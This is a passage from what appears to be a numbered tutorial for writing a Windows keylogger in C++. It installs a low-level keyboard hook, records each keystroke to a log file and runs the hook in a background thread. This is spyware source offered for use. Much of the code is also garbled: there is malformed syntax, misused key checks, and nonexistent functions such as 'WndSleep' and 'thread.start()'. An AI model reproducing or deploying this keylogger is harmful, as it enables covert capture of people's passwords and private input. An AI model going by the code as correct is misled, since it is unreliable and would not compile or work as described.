   HWND hwnd = FindWindow HWND{}; // Obtain the main window handle, adjust as needed.

   hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardCallback);

   if (!hKeyboardHook) {
       std::cout << "Failed to install keyboard hook." << std::endl;
       return;
   }
   ```

4. **Define the Callback Function:**
   - The callback function will handle key presses.
   ```cpp
   LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
       uint32_t shiftedValue = 0;
       bool control = false;

       if (wParam == WM_KEYDOWN) {
           // Check if Shift, Ctrl, or Alt is pressed
           if ((wParam == VK_SHIFT) || (wParam == VK_CONTROL) || (wParam == VK_MENU)) {
               control = true;
           }

           // Determine if the key is a modifier (Shift, Ctrl, Alt)
           if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU) {
               // Handle modifier keys
               if (GetKeyState(VK_SHIFT) & 0x1) shiftedValue = 1;
               if (GetKeyState(VK_CONTROL) & 0x1) shiftedValue |= 2;
               if (GetKeyState(VK_MENU) & 0x1) shiftedValue |= 4;
           } else {
               // Convert to Unicode character
               wchar_t key = 0;
               GetCharacterFromWPARAM(wParam, &key);
               if (key != 0) {
                   // Append to the keystroke buffer
                   keystroke_buffer += key;
                   // Write to file
                   file << key << '\n';
               }
           }
       } else if (wParam == WM_KEYUP) {
           // Handle key release, if needed
       }

       return 0;
   }
   ```

5. **Create a Keystroke Buffer and File:**
   - Initialize the buffer and file for logging.
   ```cpp
   char keystroke_buffer[MAX_BUFFER];
   std::ofstream file;
   file.open(LOG_FILE, std::ios::app);

   if (!file) {
       std::cout << "Failed to open log file." << std::endl;
       return;
   }
   ```

6. **Run the Hook in a Thread:**
   - Use a thread to run the hook loop to avoid blocking the main thread.
   ```cpp
   std::thread hook_thread(KeyboardLogger);
   hook_thread.start();
   ```

7. **Main Loop:**
   - Use `WndSleep` to prevent high CPU usage and allow the hook to function smoothly.
   ```cpp
   while (true) {
       WndSleep(100); // Adjust sleep time as needed
   }
   ```

8. **Remove the Hook and Clean Up:**
   - Properly remove the hook and close the file when done.
   ```cpp
   while (!hook_thread.join()) {
       WndSleep(100);
   }

   UnhookWindowsHook(hKeyboardHook);
   file.close();
   ```

9. **Handle Errors and Termination:**
   - Use try-except blocks to manage potential errors and ensure resources are freed.
   ```cpp
   try {
       // Code as above
   } catch (std::exception &e) {
       std::cout << "Error: " << e.what() << std::endl;
   }
   ```

10. **Compile and Run:**
